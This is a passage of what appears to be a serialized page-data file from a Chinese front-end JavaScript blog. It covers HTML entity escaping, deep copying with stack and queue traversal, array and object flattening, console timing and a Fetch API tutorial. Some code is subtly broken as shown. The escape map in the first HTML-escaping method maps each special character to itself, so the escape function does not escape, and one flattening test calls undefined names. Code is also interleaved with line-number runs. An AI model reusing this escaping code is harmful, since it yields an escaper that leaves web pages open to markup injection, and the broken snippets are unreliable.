[ ] \n    \n      //最内层变成数组的了    \n     rawData [ prop ] [ pr ] . map ( \n           item   =>   { \n             let  tempTempTempObj  =   { } \n            tempTempTempObj . label  =  item\n            tempTempTempObj . value  =  item\n            tempTempArr . push ( tempTempTempObj ) \n           } \n         ) \n\n        tempTempObj . children  =  tempTempArr\n        tempObj . children . push ( tempTempObj ) \n       } \n      finalArr . push ( tempObj ) \n\n } \nconsole . log ( finalArr ) ; \n\nfs . writeFile ( \'temp.js\' ,   JSON . stringify ( finalArr ) ,   ( err )   =>   { \n   if   ( err )   throw  err ; \n  console . log ( \'The file has been saved!\' ) ; \n } ) \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 运行 \n node test . js\n \n 1 '},{title:"将HTML特殊转义为实体字符",frontmatter:{title:"将HTML特殊转义为实体字符",date:"2021-05-16T11:39:01.000Z",tags:["html","JavaScript"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javascript_3opacq1jP.html",relativePath:"blogs/javascript/javascript_3opacq1jP.md",key:"v-8ce62bd6",path:"/blogs/javascript/javascript_3opacq1jP.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 前端开发工作中，经常需要将HTML的左右尖括号等转义成实体形式。我们不能把<，>，&等直接显示在最终看到的网页里。需要将其转义后才能在网页上显示。 \n 转义字符（Escape Sequence）也称字符实体(Character Entity)。定义转义字符串的主要原因是 \n \n “<”和“>”等符号已经用来表示HTML TAG，因此不能直接当作文本中的符号来使用。但有时需求是在HTML页面上使用这些符号，所以需要定义它的转义字符串。 \n 有些字符在ASCII字符集中没有定义（如版权符号“©”）。因此需要使用转义字符（“©”对应的转义字符是“©”）来表示。 \n \n 这里提供两个函数escape和unescape，分别实现将HTML转义为实体和回转。 \n 方式一、一个映射表+正则替换 \n var  keys  =  Object . keys  ||   function ( obj )   { \n    obj  =   Object ( obj ) \n     var  arr  =   [ ]    \n     for   ( var  a  in  obj )  arr . push ( a ) \n     return  arr\n } \n var   invert   =   function ( obj )   { \n    obj  =   Object ( obj ) \n     var  result  =   { } \n     for   ( var  a  in  obj )  result [ obj [ a ] ]   =  a\n     return  result\n } \n ` var entityMap = {\n    escape: {\n      '&': '&',\n      '<': '<',\n      '>': '>',\n      '\"': '\"',\n      \"'\": '''\n    }\n} ` \nentityMap . unescape  =   invert ( entityMap . escape ) \n var  entityReg  =   { \n    escape :   RegExp ( '['   +   keys ( entityMap . escape ) . join ( '' )   +   ']' ,   'g' ) , \n    unescape :   RegExp ( '('   +   keys ( entityMap . unescape ) . join ( '|' )   +   ')' ,   'g' ) \n } \n \n // 将HTML转义为实体 \n function   escape ( html )   { \n     if   ( typeof  html  !==   'string' )   return   '' \n     return  html . replace ( entityReg . escape ,   function ( match )   { \n         return  entityMap . escape [ match ] \n     } ) \n } \n // 将实体转回为HTML \n function   unescape ( str )   { \n     if   ( typeof  str  !==   'string' )   return   '' \n     return  str . replace ( entityReg . unescape ,   function ( match )   { \n         return  entityMap . unescape [ match ] \n     } )    \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #  方式二、利用浏览器DOM API \n // 将HTML转义为实体 \n function   escape ( html ) { \n     var  elem  =  document . createElement ( 'div' ) \n     var  txt  =  document . createTextNode ( html ) \n    elem . appendChild ( txt ) \n     return  elem . innerHTML ; \n } \n // 将实体转回为HTML \n function   unescape ( str )   { \n     var  elem  =  document . createElement ( 'div' ) \n    elem . innerHTML  =  str\n     return  elem . innerText  ||  elem . textContent\n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 有个缺陷是只能转义“< > & ”，对于单引号，双引号都不转义。另外一些非ASCII也不能转义。选择时须注意。 \n 比较： \n 方式1 代码量较大，但灵活性，完整性都比方式2强。可根据需求添加或减少映射表entityMap，且可以运行在任意JS环境中。 \n 方式2 为hack方式，代码量少很多，利用浏览器内部API就行了转义和转回（主流浏览器都支持）。不具完整性，很明显只能在浏览器环境中使用（比如不能在Node.js中跑）。 \n"},{title:"利用深度/广度优先遍历手动实现JavaScript对象的深度拷贝",frontmatter:{title:"利用深度/广度优先遍历手动实现JavaScript对象的深度拷贝",date:"2022-02-19T19:04:42.000Z",tags:["javascript","stack","queue"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javascript_DFS_BFS.html",relativePath:"blogs/javascript/javascript_DFS_BFS.md",key:"v-1f196cb5",path:"/blogs/javascript/javascript_DFS_BFS.html",headers:[{level:2,title:"前言",slug:"前言"},{level:2,title:"深度优先遍历实现对象的深度拷贝",slug:"深度优先遍历实现对象的深度拷贝"},{level:2,title:"广度优先遍历实现对象的深度拷贝",slug:"广度优先遍历实现对象的深度拷贝"},{level:2,title:"测试",slug:"测试"},{level:2,title:"链接",slug:"链接"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 前言 \n 搜索JavaScript对象的深度拷贝，往往会冒出JSON转换和递归拷贝大法。但遇到大数据量，它们都有调用栈爆栈的风险 今天，我们尝试利用树的利用深度/广度优先遍历来实现对象的深度拷贝。以下代码在chrome环境下全部测试通过。 \n 深度优先遍历实现对象的深度拷贝 \n   /**\n * 使用栈深度拷贝\n * @param {*} object 树形数据\n * @return {target}\n */ \n function   deepCopy ( orginObject )   { \n     if   ( orginObject  ==   null   ||   typeof  orginObject  !==   \'object\' )   { \n         return ; \n     } \n    console . log ( \'starting\' ) \n     const  resultObject  =   { } \n     const  rootKey  =   Symbol ( \'root\' ) ; \n     //深度遍历需要创建栈 \n     const  stack  =   [ ] ; \n     for   ( let  key  of  Object . keys ( orginObject ) )   { \n        stack . push ( { \n        key :  key , //属性名 \n        value :  orginObject [ key ] , //value属性记录当前节点下属数据 \n        parent :  resultObject //记录节点在resultObject中的位置 \n         } ) \n     } \n     while   ( stack . length )   { \n         const  currentNode  =  stack . pop ( ) ; \n         // const parent = currentNode.parent; \n         // const currentKey = currentNode.key; \n         // const currentValue = currentNode.value; \n         const   {  key :  currentKey ,  value :  currentValue ,  parent :  parent  }   =  currentNode\n         //若是无下属对象，返回其值 \n         if   ( currentValue  ==   null   ||   typeof  currentValue  !==   \'object\' )   { \n            parent [ currentKey ]   =  currentValue ; \n         }   else   { \n             //若下属值是对象，将子节点压入栈中 \n            parent [ currentKey ]   =   Object . prototype . toString . call ( currentValue )   ===   \'[object Array]\' ? [ ] : { } ; \n             for   ( let  key  of  Object . keys ( currentValue ) )   { \n                console . log ( \'loop:\'   +  key ,  currentValue [ key ] ) \n                stack . push ( { \n                    key :  key , \n                    value :  currentValue [ key ] , \n                    parent :  parent [ currentKey ] \n                 } ) \n             } \n         } \n     } \n     return  resultObject ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 #  广度优先遍历实现对象的深度拷贝 \n 广度优先遍历对象，利用队列做中间节点缓存 \n   /**\n * 使用队列深度拷贝\n * @param {*} object 树形数据\n * @return {target}\n */ \n function   deepCopy ( orginObject )   { \n     if   ( orginObject  ==   null   ||   typeof  orginObject  !==   \'object\' )   { \n         return ; \n     } \n    console . log ( \'starting\' ) \n     const  resultObject  =   { } \n     const  rootKey  =   Symbol ( \'root\' ) ; \n     //深度遍历需要创建栈 \n     const  queue  =   [ ] ; \n     for   ( let  key  of  Object . keys ( orginObject ) )   { \n        queue . push ( { \n            key :  key , //属性名 \n            value :  orginObject [ key ] , //value属性记录当前节点下属数据 \n            parent :  resultObject //记录节点在resultObject中的位置 \n         } ) \n     } \n\n     while   ( queue . length )   { \n         const  currentNode  =  queue . shift ( ) ; \n         // const parent = currentNode.parent; \n         // const currentKey = currentNode.key; \n         // const currentValue = currentNode.value; \n         const   {  key :  currentKey ,  value :  currentValue ,  parent :  parent  }   =  currentNode\n         //若是无下属对象，返回其值 \n         if   ( currentValue  ==   null   ||   typeof  currentValue  !==   \'object\' )   { \n            parent [ currentKey ]   =  currentValue ; \n         }   else   { \n             //若下属值是对象，将子节点压入栈中 \n            parent [ currentKey ]   =   Object . prototype . toString . call ( currentValue )   ===   \'[object Array]\' ? [ ] : { } ; \n             for   ( let  key  of  Object . keys ( currentValue ) )   { \n                console . log ( \'loop:\'   +  key ,  currentValue [ key ] ) \n                queue . push ( { \n                    key :  key , \n                    value :  currentValue [ key ] , \n                    parent :  parent [ currentKey ] \n                 } ) \n             } \n         } \n     } \n     return  resultObject ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #  测试 \n let  object  = \n { \n     "a" :   { \n         "b" :   { \n             "c" :   { \n                 "d" :   "qdkabcd" \n             } \n         } , \n         "d" :   { \n             "x" :   [ \n                 { \n                     "d" :   "qdkabcd" \n                 } , \n                 { \n                     "f" :   "qdkabcd" \n                 } \n             ] \n         } , \n         "e" :   "qdkae" \n     } \n } \n\n deepCopy ( object ) \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #  链接 \n \n 同事想用递归，被我一个深度遍历打断施法 \n \n'},{title:"深层数组及对象扁平化和反扁平化对象",frontmatter:{title:"深层数组及对象扁平化和反扁平化对象",date:"2021-10-18 20:17:11",tags:["JavaScript","TypeScript"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javascript_array_flat.html",relativePath:"blogs/javascript/javascript_array_flat.md",key:"v-29746f67",path:"/blogs/javascript/javascript_array_flat.html",headers:[{level:2,title:"前言",slug:"前言"},{level:2,title:"数组扁平化(javascript)",slug:"数组扁平化-javascript"},{level:3,title:"递归：",slug:"递归"},{level:3,title:"非递归",slug:"非递归"},{level:3,title:"underscore实现源码：",slug:"underscore实现源码"},{level:3,title:"测试",slug:"测试"},{level:2,title:"对象扁平化(javascript)",slug:"对象扁平化-javascript"},{level:3,title:"递归",slug:"递归-2"},{level:3,title:"非递归",slug:"非递归-2"},{level:3,title:"测试",slug:"测试-2"},{level:2,title:"数组扁平化(typescript)",slug:"数组扁平化-typescript"},{level:3,title:"代码实现",slug:"代码实现"},{level:2,title:"对象扁平化(typescript)",slug:"对象扁平化-typescript"},{level:3,title:"代码实现",slug:"代码实现-2"},{level:2,title:"数组对象扁平化(typescript)",slug:"数组对象扁平化-typescript"},{level:3,title:"代码实现",slug:"代码实现-3"},{level:2,title:"反扁平化",slug:"反扁平化"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 前言 \n 有时候后台返回前端的数据结构嵌套层数过深，访问里面的属性的时候过于复杂，于是乎就有了深层数组及对象的扁平化方式。 \n 数组扁平化(javascript) \n 递归： \n 「步骤：」\n\n创建一个空的新数组；\n\n遍历多维数组；\n\n如果当前元素是非数组，将元素添加到新数组末尾；\n\n如果当前元素是数组，元素调用函数本身；\n\n返回新数组。\n \n   function   flatten ( array ,  result )   { \n            result  =  result  ||   [ ] ; \n            array . forEach ( element   =>   { \n                 if   ( Array . isArray ( element ) )   { \n                     flatten ( element ,  result ) ; \n                 }   else   { \n                    result . push ( element ) ; \n                 } \n             } ) ; \n             return  result ; \n         } \n \n 1 2 3 4 5 6 7 8 9 10 11 #  非递归 \n 「步骤：」\n\n创建一个空的新数组；\n\n创建一个队列；\n\n循环遍历队列，每次移除首个元素；\n\n如果首个元素是非数组，将首个元素添加到新数组开头；\n\n如果首个元素是数组，将首个元素添加到队列的末尾；\n\n返回新数组。\n \n function   flat ( array ) { \n     let  arr  =   [ ] ; \n     let  queue  =  array ; \n     if ( ! queue . length ) { \n         return   [ ] ; \n     } \n     while ( queue . length ) { \n         let  val  =  queue . pop ( ) ; \n         if ( Array . isArray ( val ) ) { \n            queue . push ( ... val ) ; \n         } else { \n            arr . unshift ( val ) ; \n         } \n     } \n     return  arr ; \n } \n flat ( arr ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #  underscore实现源码： \n   // Internal implementation of a recursive `flatten` function. \n   var   flatten   =   function ( input ,  shallow ,  strict ,  output )   { \n    output  =  output  ||   [ ] ; \n     var  idx  =  output . length ; \n     for   ( var  i  =   0 ,  length  =   getLength ( input ) ;  i  <  length ;  i ++ )   { \n       var  value  =  input [ i ] ; \n       if   ( isArrayLike ( value )   &&   ( _ . isArray ( value )   ||  _ . isArguments ( value ) ) )   { \n         // Flatten current level of array or arguments object. \n         if   ( shallow )   { \n           var  j  =   0 ,  len  =  value . length ; \n           while   ( j  <  len )  output [ idx ++ ]   =  value [ j ++ ] ; \n         }   else   { \n           flatten ( value ,  shallow ,  strict ,  output ) ; \n          idx  =  output . length ; \n         } \n       }   else   if   ( ! strict )   { \n        output [ idx ++ ]   =  value ; \n       } \n     } \n     return  output ; \n   } ; \n\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #  测试 \n var  arr  =   [ 2 ,   [ 3 ,   4 ] , \n     [ \n         [ 5 ] , \n         [ 6 ] \n     ] \n ] ; \n var  result  =   flatten ( arr ) ; \nconsole . log ( result ) ; \n \n 1 2 3 4 5 6 7 8 #  对象扁平化(javascript) \n 递归 \n 「步骤：」\n\n创建一个空新对象；\n\n遍历对象属性；\n\n如果当前属性是基本类型，将属性及值复制到新对象上；\n\n如果当前属性是引用类型，将属性及值递归调用函数本身；\n\n返回新对象。\n \n function   flat ( obj ,  key  =   "" ,  res  =   { } ,  isArray  =   false )   {  \n   for   ( let   [ k ,  v ]   of  Object . entries ( obj ) )   {  \n     if   ( Array . isArray ( v ) )   {  \n       let  tmp  =  isArray  ?  key  +   "["   +  k  +   "]"   :  key  +  k \n       flat ( v ,  tmp ,  res ,   true )  \n     }   else   if   ( typeof  v  ===   "object" )   {  \n       let  tmp  =  isArray  ?  key  +   "["   +  k  +   "]."   :  key  +  k  +   "."  \n       flat ( v ,  tmp ,  res )  \n     }   else   {  \n       let  tmp  =  isArray  ?  key  +   "["   +  k  +   "]"   :  key  +  k \n      res [ tmp ]   =  v \n     }  \n   }  \n   return  res \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #  非递归 \n 「步骤：」\n\n创建一个空新对象；\n\n创建一个队列；\n\n循环遍历队列，每次移除首个元素键值对数组；\n\n如果首个元素键值对数组的值是基本类型，将键及值复制到新对象上；\n\n如果首个元素键值对数组的值是引用类型，将键及值添加到队列的末尾；\n\n返回新对象。\n \n /**\n * 使用队列或栈 扁平数组\n * @param {*} object 树形数据\n * @return {target}\n */ \n function   flat ( object ) { \n     let  res  =   { } ; \n     let  queue  =  Object . entries ( object ) ; \n     while ( queue . length ) { \n         // 栈 FILO Array.pop() 删除数组的最后一个元素并返回删除的元素 \n         // const [key, obj] = queue.pop(); \n         // 队列 FIFO Array.shift() 删除并返回数组的第一个元素。 \n         let   [ key ,  obj ]   =  queue . shift ( ) ; \n        Object . entries ( obj ) . forEach ( item => { \n             let   [ k ,  v ]   =  item ; \n             if ( typeof  v !=   \'object\' ) { \n                res [ ` ${ key } . ${ k } ` ]   =  v ; \n             } else { \n                 // Array.shift() 向数组的末尾添加一个或更多元素，并返回新的长度。 \n                queue . push ( [ ` ${ key } . ${ k } ` ,  v ] ) ; \n             } \n         } ) ; \n     } \n     return  res ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #  测试 \n let  object  = \n { \n     "a" :   { \n         "b" :   { \n             "c" :   { \n                 "d" :   "qdkabcd" \n             } \n         } , \n         "d" :   { \n             "x" :   [ \n                 { \n                     "d" :   "qdkabcd" \n                 } , \n                 { \n                     "f" :   "qdkabcd" \n                 } \n             ] \n         } , \n         "e" :   "qdkae" \n     } \n } \n var  result  =   flattenObj ( entryObj ) ; \nconsole . log ( result ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #  数组扁平化(typescript) \n 代码实现 \n    flatten ( array :   any [ ] ,  result :   any [ ] ) :   Array < any >   { \n    result  =  result  ||   [ ] ; \n    array . forEach ( ( element )   =>   { \n       if   ( Array . isArray ( element ) )   { \n         this . flatten ( element ,  result ) ; \n       }   else   { \n        result . push ( element ) ; \n       } \n     } ) ; \n     return  result ; \n   } \n \n 1 2 3 4 5 6 7 8 9 10 11 #  对象扁平化(typescript) \n 代码实现 \n    flat ( obj :  Object ,  key  =   \'\' ,  res :   {   [ x :   string ] :   unknown   } ,  isArray  =   false )   { \n     for   ( let   [ k ,  v ]   of  Object . entries ( obj ) )   { \n       if   ( Array . isArray ( v ) )   { \n         let  tmp  =  isArray  ?  key  +   \'[\'   +  k  +   \']\'   :  key  +  k ; \n         this . flat ( v ,  tmp ,  res ,   true ) ; \n       }   else   if   ( typeof  v  ===   \'object\' )   { \n         let  tmp  =  isArray  ?  key  +   \'[\'   +  k  +   \'].\'   :  key  +  k  +   \'.\' ; \n         this . flat ( v ,  tmp ,  res ) ; \n       }   else   { \n         let  tmp  =  isArray  ?  key  +   \'[\'   +  k  +   \']\'   :  key  +  k ; \n        res [ tmp ]   =  v ; \n       } \n     } \n     return  res ; \n   } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #  数组对象扁平化(typescript) \n 代码实现 \n let  arr  =   [ \n       { \n        a :   { \n          b :   { \n            c :   { \n              dd :   \'abcdd\' , \n             } , \n           } , \n          d :   { \n            xx :   \'adxx\' , \n           } , \n          e :   \'ae\' , \n         } , \n       } , \n       { \n        a :   { \n          b :   { \n            c :   { \n              dd :   \'abcdd\' , \n             } , \n           } , \n          d :   { \n            xx :   \'adxx\' , \n           } , \n          e :   \'ae\' , \n         } , \n       } , \n     ] ; \n     debugger ; \n\n     // 第一种 \n     let  arr2  =  arr . map ( ( e )   =>   this . flat ( e ) ) ; \n     // 第二种 \n     let  arr3  =  arr . map ( ( e )   =>   { \n       return   this . flat ( e ) ; \n     } ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #  反扁平化 \n function   unflatten ( obj )   { \n   let  o  =   { } \n   for   ( let  key  in  obj )   { \n     transformKey ( key ,  obj [ key ] ,  o ) \n   } \n   return  o\n } \n //转化key \n function   transformKey ( key , value , head ) { \n  const  arr  =  key . split ( \'.\' ) \n  let  tmp  =  head\n  for ( let  i  = 0 ; i < arr . length ; i ++ )   { \n   let  key  =  arr [ i ] \n   let  nextKey  =  arr [ i  +   1 ] ; \n   //这里需要判断key 是否包含[]字符串，如果是则是数组结构 \n   if ( / \\[.+?\\] / g . test ( key ) ) { \n    //可能是多维数组，匹配数组维度 \n     let  indexs  =  key . match ( / \\[(.+?)\\] / g ) ; \n     //获取数组的key值 \n     let  _key  =  key . match ( / ^(.+?)\\[ / ) [ 1 ] ; \n     //构造数组需要判断是否已经存在 \n    tmp [ _key ]   =  tmp [ _key ] ? tmp [ _key ] : [ ] \n     let  n  =  tmp [ _key ] \n\n     //构造完数组对数组里面进行构造 \n     for ( let  j = 0 ; j < indexs . length ; j ++ ) { \n       let  index  =  indexs [ j ] . replace ( / \\[|\\] / g ,   \'\' ) ; \n       let  nextIndex  =  indexs [ j + 1 ] \n\n       //数组包含数组 \n       if ( nextIndex ) { \n        //构造数组需要判断是否已经存在 \n\n        n [ index ]   =  n [ index ] ? n [ index ] : [ ] \n         //如果还包含数组，将n指针指向下一个数组 \n        n  =  n [ index ] \n\n       } else { \n        //如果后面还有则构造对象 \n        if   ( nextKey )   { \n         //构造对象需要判断是否已经存在 \n         n [ index ]   =  n [ index ] ? n [ index ] : { } \n         tmp  =  n [ index ] \n         }   else   { \n         n [ index ]   =  value\n         } \n       } \n     } \n   }   else   { \n      //不是数组和之前方法保持一致 \n      if   ( nextKey )   { \n        //构造对象需要判断是否已经存在 \n        tmp [ key ]   =  tmp [ key ] ? tmp [ key ] : { } \n        tmp  =  tmp [ key ] \n      }   else   { \n        tmp [ key ]   =  value\n      } \n   } \n\n  } \n  return  head\n } \n\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 '},{title:"JavaScript await and async",frontmatter:{title:"JavaScript await and async",date:"2021-12-24 21:48:51",tags:["JavaScript"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javascript_await_async.html",relativePath:"blogs/javascript/javascript_await_async.md",key:"v-2784e116",path:"/blogs/javascript/javascript_await_async.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" \n async 函数的含义和用法 \n async和await:让异步编程更简单 \n js异步处理的三种方式 \n \n"},{title:"测试 JavaScript 运行时间",frontmatter:{title:"测试 JavaScript 运行时间",date:"2021-03-03T10:59:36.000Z",tags:["JavaScript","console"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javascript_ce-shi-javascript-yun-xing-shi-jian.html",relativePath:"blogs/javascript/javascript_ce-shi-javascript-yun-xing-shi-jian.md",key:"v-227c8f35",path:"/blogs/javascript/javascript_ce-shi-javascript-yun-xing-shi-jian.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 有时候需要知道指定的方法运行了多长时间，可以使用以下的方法。 \n $ ( function   ( )   { \n        console . time ( "测试 fn 速度: " ) ; \n         testFunction ( ) ; \n        console . timeEnd ( "测试 fn 速度: " ) ; \n } \n \n 1 2 3 4 5 另外，console 还有其他比较有趣的方法。 \n \n console.count(label)  输出运行次数 \n console.table(object|array)  输出表格形态的数据（在动态绘制的检查时用的较多） \n console.group(label) 和 console.groupEnd(label) 将 console 结果进行分组（分类及减少输出版面，但也加大了我们的脑回路呀）（group = groupCollapsed 是一样的） \n console.trace() 检测方法的调用来源，超级赞 \n console.profile(label) 和 console.profileEnd(label) 是 time 的升级版，不但测速，直接测性能了，需要到 profile 面板里面才能看到结果 \n console.assert(boolean, string) 提示报错可以少个判断 \n \n'},{title:"Fetch API 教程",frontmatter:{title:"Fetch API 教程",date:"2021-12-24 21:13:03",tags:["JavaScript","fetch"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javascript_fetch-tutorial.html",relativePath:"blogs/javascript/javascript_fetch-tutorial.md",key:"v-58810e03",path:"/blogs/javascript/javascript_fetch-tutorial.html",headers:[{level:2,title:"一、基本用法",slug:"一、基本用法"},{level:2,title:"二、Response 对象：处理 HTTP 回应",slug:"二、response-对象-处理-http-回应"},{level:3,title:"2.1 Response 对象的同步属性",slug:"_2-1-response-对象的同步属性"},{level:3,title:"2.2 判断请求是否成功",slug:"_2-2-判断请求是否成功"},{level:3,title:"2.3 Response.headers 属性",slug:"_2-3-response-headers-属性"},{level:3,title:"2.4 读取内容的方法",slug:"_2-4-读取内容的方法"},{level:3,title:"2.5 Response.clone()",slug:"_2-5-response-clone"},{level:3,title:"2.6 Response.body 属性",slug:"_2-6-response-body-属性"},{level:2,title:"三、fetch()的第二个参数：定制 HTTP 请求",slug:"三、fetch-的第二个参数-定制-http-请求"},{level:3,title:"（1）POST 请求",slug:"_1-post-请求"},{level:3,title:"（2）提交 JSON 数据",slug:"_2-提交-json-数据"},{level:3,title:"（3）提交表单",slug:"_3-提交表单"},{level:3,title:"（4）文件上传",slug:"_4-文件上传"},{level:3,title:"（5）直接上传二进制数据",slug:"_5-直接上传二进制数据"},{level:2,title:"四、fetch()配置对象的完整 API",slug:"四、fetch-配置对象的完整-api"},{level:3,title:"cache",slug:"cache"},{level:3,title:"mode",slug:"mode"},{level:3,title:"credentials",slug:"credentials"},{level:3,title:"signal",slug:"signal"},{level:3,title:"keepalive",slug:"keepalive"},{level:3,title:"redirect",slug:"redirect"},{level:3,title:"integrity",slug:"integrity"},{level:3,title:"referrer",slug:"referrer"},{level:3,title:"referrerPolicy",slug:"referrerpolicy"},{level:2,title:"五、取消fetch()请求",slug:"五、取消fetch-请求"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" fetch()是 XMLHttpRequest 的升级版，用于在 JavaScript 脚本里面发出 HTTP 请求。 \n 浏览器原生提供这个对象。本文详细介绍它的用法。 \n 一、基本用法 \n fetch()的功能与 XMLHttpRequest 基本相同，但有三个主要的差异。 \n （1）fetch()使用 Promise，不使用回调函数，因此大大简化了写法，写起来更简洁。 \n （2）fetch()采用模块化设计，API 分散在多个对象上（Response 对象、Request 对象、Headers 对象），更合理一些；相比之下，XMLHttpRequest 的 API 设计并不是很好，输入、输出、状态都在同一个接口管理，容易写出非常混乱的代码。 \n （3）fetch()通过数据流（Stream 对象）处理数据，可以分块读取，有利于提高网站性能表现，减少内存占用，对于请求大文件或者网速慢的场景相当有用。XMLHTTPRequest 对象不支持数据流，所有的数据必须放在缓存里，不支持分块读取，必须等待全部拿到后，再一次性吐出来。 \n 在用法上，fetch()接受一个 URL 字符串作为参数，默认向该网址发出 GET 请求，返回一个 Promise 对象。它的基本用法如下。 \n fetch ( url ) \n   . then ( ... ) \n   . catch ( ... ) \n \n 1 2 3 下面是一个例子，从服务器获取 JSON 数据。 \n fetch ( 'https://api.github.com/users/ruanyf' ) \n   . then ( response   =>  response . json ( ) ) \n   . then ( json   =>  console . log ( json ) ) \n   . catch ( err   =>  console . log ( 'Request Failed' ,  err ) ) ; \n \n 1 2 3 4 上面示例中，fetch()接收到的response是一个 Stream 对象，response.json()是一个异步操作，取出所有内容，并将其转为 JSON 对象。 \n Promise 可以使用 await 语法改写，使得语义更清晰。 \n async   function   getJSON ( )   { \n   let  url  =   'https://api.github.com/users/ruanyf' ; \n   try   { \n     let  response  =   await   fetch ( url ) ; \n     return   await  response . json ( ) ; \n   }   catch   ( error )   { \n    console . log ( 'Request Failed' ,  error ) ; \n   } \n } \n \n 1 2 3 4 5 6 7 8 9 上面示例中，await语句必须放在try...catch里面，这样才能捕捉异步操作中可能发生的错误。\n后文都采用await的写法，不使用.then()的写法。 \n 二、Response 对象：处理 HTTP 回应 \n 2.1 Response 对象的同步属性 \n fetch()请求成功以后，得到的是一个 Response 对象。它对应服务器的 HTTP 回应。 \n const  response  =   await   fetch ( url ) ; \n \n 1 前面说过，Response 包含的数据通过 Stream 接口异步读取，但是它还包含一些同步属性，对应 HTTP 回应的标头信息（Headers），可以立即读取。 \n async   function   fetchText ( )   { \n   let  response  =   await   fetch ( '/readme.txt' ) ; \n  console . log ( response . status ) ; \n  console . log ( response . statusText ) ; \n } \n \n 1 2 3 4 5 上面示例中，response.status和response.statusText就是 Response 的同步属性，可以立即读取。\n标头信息属性有下面这些。 \n \n \n Response.ok\nResponse.ok属性返回一个布尔值，表示请求是否成功，true对应 HTTP 请求的状态码 200 到 299，false对应其他的状态码。 \n \n \n Response.status\nResponse.status属性返回一个数字，表示 HTTP 回应的状态码（例如200，表示成功请求）。 \n \n \n Response.statusText\nResponse.statusText属性返回一个字符串，表示 HTTP 回应的状态信息（例如请求成功以后，服务器返回\"OK\"）。 \n \n \n Response.url\nResponse.url属性返回请求的 URL。如果 URL 存在跳转，该属性返回的是最终 URL。 \n \n \n Response.type\nResponse.type属性返回请求的类型。可能的值如下： \n   1. basic：普通请求，即同源请求。\n  2. cors：跨域请求。\n  3. error：网络错误，主要用于 Service Worker。\n  4. opaque：如果fetch()请求的type属性设为no-cors，就会返回这个值，详见请求部分。表示发出的是简单的跨域请求，类似`<form>`表单的那种跨域请求。\n  5. opaqueredirect：如果fetch()请求的redirect属性设为manual，就会返回这个值，详见请求部分。\n \n \n \n Response.redirected\nResponse.redirected属性返回一个布尔值，表示请求是否发生过跳转。 \n 2.2 判断请求是否成功 \n fetch()发出请求以后，有一个很重要的注意点：只有网络错误，或者无法连接时，fetch()才会报错，其他情况都不会报错，而是认为请求成功。\n这就是说，即使服务器返回的状态码是 4xx 或 5xx，fetch()也不会报错（即 Promise 不会变为 rejected状态）。\n只有通过Response.status属性，得到 HTTP 回应的真实状态码，才能判断请求是否成功。请看下面的例子 \n async   function   fetchText ( )   { \n   let  response  =   await   fetch ( '/readme.txt' ) ; \n   if   ( response . status  >=   200   &&  response . status  <   300 )   { \n     return   await  response . text ( ) ; \n   }   else   { \n     throw   new   Error ( response . statusText ) ; \n   } \n } \n \n 1 2 3 4 5 6 7 8 上面示例中，response.status属性只有等于 2xx （200~299），才能认定请求成功。这里不用考虑网址跳转（状态码为 3xx），因为fetch()会将跳转的状态码自动转为 200。 \n 另一种方法是判断response.ok是否为true。 \n if   ( response . ok )   { \n   // 请求成功 \n }   else   { \n   // 请求失败 \n } \n \n 1 2 3 4 5 #  2.3 Response.headers 属性 \n Response 对象还有一个Response.headers属性，指向一个 Headers 对象，对应 HTTP 回应的所有标头。 \n Headers 对象可以使用for...of循环进行遍历。 \n const  response  =   await   fetch ( url ) ; \n\n for   ( let   [ key ,  value ]   of  response . headers )   { \n  console . log ( ` ${ key }  :  ${ value } ` ) ; \n } \n\n // 或者 \n for   ( let   [ key ,  value ]   of  response . headers . entries ( ) )   { \n  console . log ( ` ${ key }  :  ${ value } ` ) ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 Headers 对象提供了以下方法，用来操作标头。 \n Headers.get()：根据指定的键名，返回键值。\nHeaders.has()： 